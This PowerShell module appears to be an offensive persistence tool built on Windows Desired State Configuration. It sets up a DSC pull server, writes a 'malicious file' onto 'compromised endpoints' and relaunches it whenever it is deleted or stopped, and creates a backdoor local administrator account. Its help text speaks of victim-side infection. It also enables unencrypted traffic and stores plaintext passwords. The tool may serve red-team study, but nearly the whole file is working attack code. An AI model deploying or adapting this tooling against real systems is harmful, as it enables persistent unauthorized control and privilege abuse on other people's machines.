function New-Configuration {
<#
.SYNOPSIS

Creates DSC configuration from provided resource objects

.DESCRIPTION

Creates DSC configuration. Given an array of resource objects creates and hosts configuration. 

.PARAMETER ResourceObject

Object array of resources to be included in configuration

.EXAMPLE

PS C:\> New-Configuration -ResourceObject $User,$Payload

Description
-----------

Creates configuration from two previously defined objects $User and $Payload

#>

    [CmdletBinding()] Param(
    [Parameter(Mandatory = $True,
        ValueFromPipeline=$True
    )]
    [Object[]] $ResourceObject
    )
    # Create GUID for configuration
    $Guid = [guid]::NewGuid()
    

    Configuration CombinedConfig {
        Param(
        [Parameter(Mandatory = $True)]
        [String[]] $NodeGUID
        )

        Node $NodeGUID {
            foreach ($configobj in $ResourceObject){
                If ($configobj.Type -eq "Payload") {
                    $FileBytes = [System.IO.File]::ReadAllBytes($configobj.Sourcefile)
                    CreatePayload $configobj.DestinationPath {}
                }
                ElseIf ($configobj.Type -eq "User") {
                    CreateAdmin $configobj.Username {}

                }
            }

        }

    }

   Configuration CreatePayload {
        $DestinationPath = $configobj.DestinationPath
        $Arguments = $configobj.Arguments
        Script Ensure-File {
            SetScript = $([string]{
                $bytes = [byte[]]($FileBytes).split(' ')
                [System.IO.File]::WriteAllBytes($DestinationPath, $bytes)
            }).Replace('$FileBytes', "'$FileBytes'").Replace('$DestinationPath', "'$DestinationPath'")
                
            TestScript = $([string]{
                Test-Path $DestinationPath
            }).Replace('DestinationPath', "'$DestinationPath'")

            GetScript = {
                return @{
                    GetScript 	= $GetScript
                    SetScript 	= $SetScript
                    TestScript 	= $TestScript
                }
            }
        }
        Script Ensure-Process {
                SetScript = $([string]{
                    if ($Arguments -eq "") {
                        Start-Process $DestinationPath
                    }
                    else {
                        Start-Process $DestinationPath $Arguments
                    }
                }).Replace('$DestinationPath', "'$DestinationPath'").Replace('$Arguments', "'$Arguments'")
            TestScript = $([string]{
                (get-process).path -contains $DestinationPath
            }).Replace('$DestinationPath', "'$DestinationPath'")
                    
            GetScript = {
                return @{
                    GetScript 	= $GetScript
                    SetScript 	= $SetScript
                    TestScript 	= $TestScript
                }
            }
        }        
         
    }

    $configData = @{
        AllNodes = @(
                        @{
                            NodeName = [string]$Guid;
                            PSDscAllowPlainTextPassword = $true
                            }
            )
        }

    Configuration CreateAdmin {
        
        $Username = $configobj.Username
        $Password = $configobj.Password
        $Group    = $configobj.Group
        
        $pass = ConvertTo-SecureString $Password -AsPlainText -Force 
        $credObject = New-Object System.Management.Automation.PSCredential($Username, $pass)

        

        User newUser {
            UserName                 = $Username
            Password                 = $credObject
            PasswordNeverExpires     = $false
            Ensure                   = "Present"
        }
        Group Admins {
            Ensure               = "Present"
            GroupName            = $Group
            MembersToInclude     = $Username
            DependsOn            = "[User]newUser"

            
            } 
    }

CombinedConfig -NodeGUID $Guid -ConfigurationData $configData -OutputPath "$env:SystemDrive\Program Files\WindowsPowershell\DscService\Configuration"

New-DscChecksum -ConfigurationPath "$env:SystemDrive\Program Files\WindowsPowershell\DscService\Configuration\" -OutPath "$env:SystemDrive\Program Files\WindowsPowershell\DscService\Configuration"


}


function New-User {
<#
.SYNOPSIS

Initiates a user object to be used in configuring DSC pull server

.DESCRIPTION

Returns a create user object. This object is to passed to"Generate-Configuration" when creating a user configuration.


.PARAMETER Username

Name of account to be created on endpoints.
If not given at the command line this propery must be set before running "Generate-Configuration".

.PARAMETER Password

Password used for user account. Password must meet complexity requirements of any infected endpoint or user account will not be created.
If not given at the command line this propery must be set before running "Generate-Configuration".
Note: Password is stored in clear text within the MOF file.

.PARAMETER Group

Optionally specifies the group the user should be added to. Default is 'Adminstrators'. 

.EXAMPLE

PS C:\> New-User -Username test_user -Password Long_And_Complex!

Description
-----------

Creates an object for the user account 'test_user' with password 'Long_And_Complex!' and adds user to local administrators group.


.EXAMPLE


PS C:\> New-User -Username test_user -Password Long_And_Complex! -Group RemoteAdmins

Description
-----------
Creates an object for the user account 'test_user' with password 'Long_And_Complex!' and adds user to local 'RemoteAdmins' group. 


#>
    [CmdletBinding()] Param(
    [Parameter(Mandatory = $False)]
    [String] $Username = "",

    [Parameter(Mandatory = $False)]
    [String] $Password = "",

    [Parameter(Mandatory = $False)]
    [String] $Group = "Administrators"
    )

    $newUserObject = New-Object -TypeName PSObject
    $newUserObject | Add-Member -MemberType NoteProperty -Name Username -Value $Username
    $newUserObject | Add-Member -MemberType NoteProperty -Name Password -Value $Password
    $newUserObject | Add-Member -MemberType NoteProperty -Name Group -Value $Group
    $newUserObject | Add-Member -MemberType NoteProperty -Name Type -Value "User"

    return $newUserObject
}


function New-Payload
{
<#
.SYNOPSIS

Initiates a payload object for file and process persistence 

.DESCRIPTION

Script ensures a file is present and running on a compromised endpoint.
This object is to passed to"Generate-Configuration" when creating a user configuration.

Must be run on the DSC server before configuring any endpoints.

Malicious file must be present server side at time of initial configuration.

.PARAMETER SourceFile

Local path to the malicious file that will persistent on compromised endpoints. 
If not given at the command line this propery must be set before running "Generate-Configuration".

.PARAMETER DestinationPath

Location on compromised endpoints where the contents of 'SourceFile' should be written on compromomised endpoints. 
If not given at the command line this propery must be set before running "Generate-Configuration". 

.PARAMETER Arguments

Optionally specifies command line arguments provided to during execution.

.EXAMPLE


PS C:\> New-Payload -SourceFile C:\Windows\System32\calc.exe -DestinationPath C:\calc.exe

Description
-----------
Server Side:
Creates an object which points to C:\Windows\System32\calc.exe which will be read into configuration

Victim Side:
Creates file C:\calc.exe with contents of C:\Windows\System32\calc.exe and ensures file is running
If file is deleted or process is stopped script will recreate file and/or relaunch process

#>
    
    [CmdletBinding()] Param(
        [Parameter(Mandatory = $False)]
        [String] $SourceFile = "",

        [Parameter(Mandatory = $False)]
        [String] $DestinationPath = "",

        [Parameter(Mandatory = $False)]
        [String] $Arguments

    )

    $newPayloadObject = New-Object -TypeName PSObject
    $newPayloadObject | Add-Member -MemberType NoteProperty -Name SourceFile -Value $SourceFile
    $newPayloadObject | Add-Member -MemberType NoteProperty -Name DestinationPath -Value $DestinationPath
    $newPayloadObject | Add-Member -MemberType NoteProperty -Name Arguments -Value $Arguments
    $newPayloadObject | Add-Member -MemberType NoteProperty -Name Type -Value "Payload"

    return $newPayloadObject
}
function Initialize-Server {

<#
.SYNOPSIS

Establishes initial configuration for DSC Pull Server

.DESCRIPTION

Creates configuration necessary for server to function as DSC Pull Server.

Requirements:
    PowerShell 4.0 or greater
    Windows feature Dsc-Service
    Installed xPSDesiredStateConfiguration Module 

.PARAMETER CompliancePort

Optional parameter that speficies port where the compliance service is hosted.
Note: Default port is 9080

.PARAMETER ConfigPort

Optional parameter that specifies port where configurations are hosts.
Note: Default port is 8080

.EXAMPLE

PS C:\> Initialize-Server -CompliancePort 9000 -ConfigPort 443

Description
-----------
Configures pull server to host compliance reports on port 9000 and configurations on port 443

#>

    [CmdletBinding()] Param(

        [Parameter(Mandatory = $False)]
        [ValidateRange(0,65535)]
        [Int] $CompliancePort = 9080,

        [Parameter(Mandatory = $False)]
        [ValidateRange(0,65535)]
        [Int] $ConfigPort = 8080

    )


    configuration SetupPullServer
    {
        param
        (
        [string[]]$ComputerName = 'localhost'
        )

        Import-DSCResource -ModuleName xPSDesiredStateConfiguration 

        Node $ComputerName
        {
            WindowsFeature DSCServiceFeature
            {
                Ensure = "Present"
                Name = "DSC-Service"
            }
            
            xDscWebService PSDSCPullServer
            {
                Ensure                    = "Present"
                EndpointName              = "PSDSCPullServer"
                Port                      = $ConfigPort
                PhysicalPath              = "$env:SystemDrive\inetpub\wwwroot\PSDSCPullServer"
                CertificateThumbPrint     = "AllowUnencryptedTraffic"
                ModulePath                = "$env:PROGRAMFILES\WindowsPowerShell\DscService\Modules"
                ConfigurationPath         = "$env:PROGRAMFILES\WindowsPowerShell\DscService\Configuration"
                State                     = "Started"
                DependsOn                 = "[WindowsFeature]DSCServiceFeature"
            }

            xDscWebService PSDSCComplianceServer
            {
                Ensure                   = "Present"
                EndpointName             = "PSDSCComplianceServer"
                Port                     = $CompliancePort
                PhysicalPath             = "$env:SystemDrive\inetpub\wwwroot\PSDSCComplianceServer"
                CertificateThumbPrint    = "AllowUnencryptedTraffic"
                State                    = "Started"
                IsComplianceServer       = $true
                DependsOn                = ("[WindowsFeature]DSCServiceFeature","[xDSCWebService]PSDSCPullServer")
            }
        }
    }

    SetupPullServer -ComputerName $env:computername
    Start-DscConfiguration .\SetupPullServer -Force -EA SilentlyContinue

}

function Get-Compliance{
<#
.SYNOPSIS

Queries information from DSC Compliance server

.DESCRIPTION

Queries DSC compliance server and returns PS objects for each computer where data is stored. 

.PARAMETER URI

Optional parameter to compliance server URI

.EXAMPLE

PS C:\> Get-Compliance

Description
-----------

Queries compliance server at the defaul URI (127.0.0.1) on the default port (9080)

#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory = $False)]
        [String] $URI = "http://127.0.0.1:9080/PSDSCComplianceServer.svc/Status"

    )

    $StCodes = @"
    0 = Pull operation was successful
    1 = Download Manager initialization failure
    2 = Get configuration command failure
    3 = Unexpected get configuration response from pull server
    4 = Configuration checksum file read failure
    5 = Configuration checksum validation failure
    6 = Invalid configuration file
    7 = Available modules check failure
    8 = Invalid configuration Id In meta-configuration
    9 = Invalid DownloadManager CustomData in meta-configuration
    10 = Get module command failure
    11 = Get Module Invalid Output
    12 = Module checksum file not found
    13 = Invalid module file
    14 = Module checksum validation failure
    15 = Module extraction failed
    16 = Module validation failed
    17 = Downloaded module is invalid
    18 = Configuration file not found
    19 = Multiple configuration files found
    20 = Configuration checksum file not found
    21 = Module not found
    22 = Invalid module version format
    23 = Invalid configuration Id format
    24 = Get Action command failed
    25 = Invalid checksum algorithm
    26 = Get Lcm Update command failed
    27 = Unexpected Get Lcm Update response from pull server
    28 = Invalid Refresh Mode in meta-configuration
    29 = Invalid Debug Mode in meta-configuration
"@
    $StCodeHashTable = ConvertFrom-StringData $StCodes

    $Type = "application/json"

    $httpCode = Invoke-WebRequest -Uri $URI -ContentType $Type -Method Get -Headers @{Accept = $Type } -UseDefaultCredentials

    if( $httpCode.StatusCode -ne 200 )
    {
        Write-Host "Failed to query compliance server"
        return
    }

    $Json =  ConvertFrom-Json $httpCode.Content

     [System.Collections.ArrayList]$ReturnArray = @()

    ForEach ($Comp in $Json.value)
    {

        $ComplyObj = New-Object -TypeName PSObject -Property @{

        'Computer' = $Comp.TargetName
        'ConfigID' = $Comp.ConfigurationId
        'ConfigCheckSum' = $Comp.TargetCheckSum
        'Compliant' = $Comp.NodeCompliant
        'LastComplianceTime' = $Comp.LastComplianceTime
        'LastCheckinTime' = $Comp.LastHeartbeatTime
        'NodeStatus' = $StCodeHashTable.Get_Item([string]$Comp.StatusCode)

        }
        $ReturnArray.Add($ComplyObj) | Out-Null
    }

    return $ReturnArray

}
